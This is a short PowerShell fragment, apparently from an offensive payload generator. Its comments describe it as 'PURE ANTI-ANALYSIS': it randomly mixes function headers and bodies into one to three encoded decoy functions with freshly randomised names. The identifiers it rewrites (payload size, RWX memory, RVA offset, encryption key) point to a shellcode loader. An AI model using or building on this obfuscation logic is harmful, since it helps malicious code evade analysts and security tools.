# INPUT PARAMS...
    # $ho2, integer, always 3
    # $lt9, integer, always 5
    # $wl9s, array of 3 strings, function headers pre-replacement
    # $ej8, array of 3 strings, function bodies pre-replacement
    # $cu8, array of function names/variable names to replace
        # always 'do3','vb8','yx4','ny1','rt2','__arg1','__arg2','__arg3','__bin','__rwx','__i',
        # '__type','__unsafe','__href','__size','__encbuf','__off','__key','__fb1','__pld_size',
        # '__rva_offset','__prot'
# OUTPUT...
    # PURE ANTI-ANALYSIS
    # takes the function headers and bodies, randomly mismatches them together, and creates an
    # encoded function from them 1-3 times with different randomly generated function and variable
    # names

$ul5=(Get-Random $ho2)+1;

# iterate between 1 and 3 times
for($fz4=0; $fz4 -lt $ul5; $fz4++) {
    $li2 =@();
    # generate more replacement function/variable names
    $li2 =rq1 $lt9 $cu8;
    $pr1 += (bi8 ($wl9s|Get-Random) ($ej8|Get-Random) $cu8 $li2)
}
$pr1
